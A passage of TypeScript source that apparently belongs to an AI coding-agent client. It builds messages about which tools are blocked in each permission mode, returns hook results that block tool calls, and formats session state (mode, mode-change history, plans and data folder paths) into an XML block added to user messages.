    return `Bash commands are blocked in ${displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${shortcut}) to run commands.`;
  }
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit') {
    return `File modifications are blocked in ${displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('mcp__')) {
    return `MCP write operations are blocked in ${displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${shortcut}) to make changes.`;
  }
  if (toolName.startsWith('api_')) {
    return `API mutations are blocked in ${displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${shortcut}) to make changes.`;
  }
  return `${toolName} is blocked in ${displayName}. Switch to Ask before edits, Edit automatically, or YOLO (${shortcut}) to use this tool.`;
}

/**
 * Create a hook return value that blocks a tool.
 * Returns the correct SDK format for PreToolUse hook blocking.
 *
 * The reason is prefixed with "[ERROR]" so the Codex model can distinguish
 * blocked tool calls from successful ones. See the detailed comment on
 * errorResponse() in packages/session-tools-core/src/response.ts for the
 * full explanation of the tool error signaling behavior.
 *
 * @param reason - The reason for blocking (from shouldAllowToolInMode)
 */
export function blockWithReason(reason: string) {
  return {
    continue: false,
    decision: 'block' as const,
    reason: `[ERROR] ${reason}`,
  };
}

// ============================================================
// Session State Context (for user messages)
// ============================================================

/**
 * Get the current session state for prompt injection
 */
export function getSessionState(sessionId: string): { permissionMode: PermissionMode } {
  return {
    permissionMode: getPermissionMode(sessionId),
  };
}

/**
 * Format session state as a lightweight XML block for injection into user messages.
 * Always includes the plans folder path so agent knows where plans are stored.
 */
export function formatSessionState(
  sessionId: string,
  options?: { plansFolderPath?: string; dataFolderPath?: string; consumeModeChangeUserSignal?: boolean }
): string {
  const diagnostics = getPermissionModeDiagnostics(sessionId);

  // Use canonical user-facing mode tokens to avoid terminology drift.
  const modeName = toCanonicalPermissionMode(diagnostics.permissionMode);
  let result = `<session_state>\nsessionId: ${sessionId}\npermissionMode: ${modeName}`;

  if (diagnostics.transitionDisplay) {
    result += `\nmodeTransition: ${diagnostics.transitionDisplay}`;
  }
  result += `\nmodeChangedBy: ${diagnostics.lastChangedBy}`;
  result += `\nmodeChangedAt: ${diagnostics.lastChangedAt}`;
  result += `\nmodeVersion: ${diagnostics.modeVersion}`;

  const transitionLabel = diagnostics.transitionDisplay ?? `Unknown -> ${PERMISSION_MODE_CONFIG[diagnostics.permissionMode].displayName}`;
  result += `\nmodeChangeSummary: Last mode change by ${diagnostics.lastChangedBy} at ${diagnostics.lastChangedAt} (${transitionLabel}, modeVersion=${diagnostics.modeVersion})`;

  if (diagnostics.userModeSignalPending) {
    result += '\nmodeChangeUserSignal: The user changed mode manually. Apply this mode immediately for this turn.';

    if (options?.consumeModeChangeUserSignal) {
      consumeUserModeSignal(sessionId);
    }
  }

  // Always include plans folder path so agent knows where plans are stored
  if (options?.plansFolderPath) {
    result += `\nplansFolderPath: ${options.plansFolderPath}`;
  }

  // Include data folder path so agent knows where transform_data output goes
  if (options?.dataFolderPath) {
    result += `\ndataFolderPath: ${options.dataFolderPath}`;
  }

  result += '\n</session_state>';
  return result;
}
